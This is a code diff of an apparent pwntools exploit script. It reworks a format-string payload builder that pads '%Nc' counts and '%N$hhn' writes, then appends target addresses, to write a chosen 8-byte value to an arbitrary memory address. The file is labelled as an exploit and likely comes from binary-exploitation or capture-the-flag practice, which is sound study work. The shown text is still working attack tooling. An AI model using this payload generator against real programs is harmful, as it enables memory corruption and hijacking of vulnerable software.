@@ -51,32 +51,49 @@ def find_offset(after = b':', option = 1):
         if option == 1 and '41414141' in output:
             return i
 
-def build_format_string(target, goal, start_byte=1, max_write=8):
-    WRAP = 0x100
+'''
+Format String Builder
+---------------------
+Accepts target and goal address fields in either int values or p64 - little endian - address formats.
+'''
+def build_format_string(target, goal, offset=1, bytes_to_write=8, max_size=8):
+    if isinstance(target, int):
+        target = p64(target)
+    if isinstance(goal, int):
+        goal = p64(goal)
 
-    bytes_list = [(goal >> (8 * i)) & 0xff for i in range(max_write)]
-    writes = [(byte_value, index) for index, byte_value in enumerate(bytes_list)]
-    writes.sort(key=lambda x: x[0])
+    if max_size % 8 != 0:
+        raise Exception('Max size must be a multiple of 8.')
 
-    payload = b''
-    written = 0 
+    while True:
+        payload = b''
+        written = 0
 
-    for idx, (byte_value, i) in enumerate(writes):
-        to_write = (byte_value - written) % WRAP
-        if to_write > 0:
-            payload += f"%{to_write}c".encode()
-            written += to_write
-        param_index = start_byte + idx
-        payload += f"%{param_index}$hhn".encode()
+        for i in range(0, bytes_to_write):
+            byte_to_write = goal[i]
 
-    padding = b'A' * ((8 - (len(payload) % 8)) % 8)
-    payload += padding
+            to_write = (byte_to_write - written) % 0x100
+            written = (written + to_write) % 0x100
 
-    for _, i in writes:
-        payload += p64(target + i)
+            if to_write > 0:
+                payload += f"%{to_write}c%{offset + (max_size // 8) + i}$hhn".encode()
+            else:
+                payload += f"%{offset + (max_size // 8) + i}$hhn".encode()
 
-    return payload
+        payload_len = len(payload)
 
+        if payload_len > max_size:
+            max_size = ((payload_len + 7) // 8) * 8
+            log.info(f"Increasing format string initial input size to {max_size}")
+            continue
+
+        payload = payload.ljust(max_size, b'A')
+
+        for i in range(0, bytes_to_write):
+            payload += p64(u64(target) + i)
+
+        return payload
+    
 ######################################
 ############## Exploit ###############
 ######################################
